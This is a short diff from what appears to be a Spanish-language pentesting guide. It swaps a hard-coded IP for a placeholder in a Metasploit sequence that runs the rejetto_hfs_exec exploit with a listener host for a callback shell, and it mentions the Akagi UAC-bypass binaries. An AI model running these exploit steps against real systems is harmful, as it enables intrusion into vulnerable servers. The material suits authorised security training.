@@ -169,7 +169,7 @@ Usa `Akagi32.exe` para objetivos de 32 bits y `Akagi64.exe` para objetivos de 64
 ```bash
 msfconsole
 msf6 > use exploit/windows/http/rejetto_hfs_exec
-msf6 > set RHOSTS 10.10.10.10
+msf6 > set RHOSTS <target_ip>
 msf6 > set LHOST <tu_ip>
 msf6 > exploit
 ```
